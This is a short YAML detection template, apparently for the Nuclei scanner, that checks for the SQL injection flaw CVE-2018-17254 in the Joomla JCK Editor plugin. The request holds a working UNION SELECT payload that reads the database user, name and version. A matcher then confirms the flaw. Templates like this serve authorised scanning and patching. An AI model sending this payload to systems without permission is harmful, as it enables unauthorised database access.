id: CVE-2018-17254

info:
  name: Joomla JCK Editor SQL Injection
  author: daniel
  severity: critical
  description: Existe SQL Injection en el siguiente endpoint jtreelink/dialogs/links.php
  remediation: Actualice el plugin

variables:
  num: "999999999"

http:
  - raw:
      - |
        GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5({{num}})),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}

    matchers:
      - type: word
        part: body
        words:
          - '{{md5(num)}}'
